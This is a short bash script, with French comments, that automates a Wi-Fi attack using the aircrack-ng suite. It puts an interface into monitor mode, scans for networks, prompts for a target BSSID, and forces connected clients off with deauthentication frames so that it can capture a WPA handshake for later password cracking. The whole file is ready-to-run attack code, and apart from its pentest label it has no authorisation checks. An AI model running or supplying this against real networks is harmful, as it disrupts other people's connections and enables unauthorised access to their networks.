#!/bin/bash
# wifi_pentest.sh - Scan & capture WPA handshake
set -euo pipefail

# Vérifie les droits root
if [[ $EUID -ne 0 ]]; then
    echo "❌ Ce script doit être exécuté en tant que root" >&2
    exit 1
fi

# Vérification des outils requis
for cmd in airmon-ng airodump-ng aireplay-ng; do
    if ! command -v "$cmd" &>/dev/null; then
        echo "❌ Outil manquant : $cmd" >&2
        exit 1
    fi
done

INTERFACE="wlan0"
OUTPUT_DIR="wifi_captures"
CHANNEL=6

usage() {
    echo "Usage: $0 [-i interface] [-c channel] [-o output_dir]" >&2
    exit 1
}

while getopts "i:c:o:h" opt; do
    case $opt in
        i) INTERFACE="$OPTARG";;
        c) CHANNEL="$OPTARG";;
        o) OUTPUT_DIR="$OPTARG";;
        h|*) usage;;
    esac
done

MONITOR_IF="${INTERFACE}mon"

mkdir -p "$OUTPUT_DIR"

echo "[*] Activation du mode monitor sur $INTERFACE..."
airmon-ng start "$INTERFACE" >/dev/null

cleanup() {
    pkill airodump-ng 2>/dev/null || true
    airmon-ng stop "$MONITOR_IF" >/dev/null || true
}
trap cleanup EXIT

echo "[*] Lancement du scan des réseaux disponibles..."
timeout 20s airodump-ng "$MONITOR_IF"

read -p "Entrez le BSSID cible : " BSSID
read -p "Entrez le nom (SSID) du réseau : " ESSID

echo "[*] Capture du handshake sur $ESSID ($BSSID)..."
CAP_BASENAME="handshake_$(date +%Y%m%d_%H%M%S)"
airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$OUTPUT_DIR/$CAP_BASENAME" "$MONITOR_IF" &

sleep 5
echo "[*] Déauthentification d’un client pour forcer handshake..."
aireplay-ng --deauth 5 -a "$BSSID" "$MONITOR_IF"

echo "[*] Attente du handshake..."
sleep 20
pkill airodump-ng

HANDSHAKE_FILE=$(ls "$OUTPUT_DIR"/${CAP_BASENAME}-*.cap 2>/dev/null | head -n 1 || true)
if [[ -f "$HANDSHAKE_FILE" ]]; then
    echo "✅ Capture terminée. Fichier : $HANDSHAKE_FILE"
else
    echo "❌ Handshake non capturé" >&2
fi

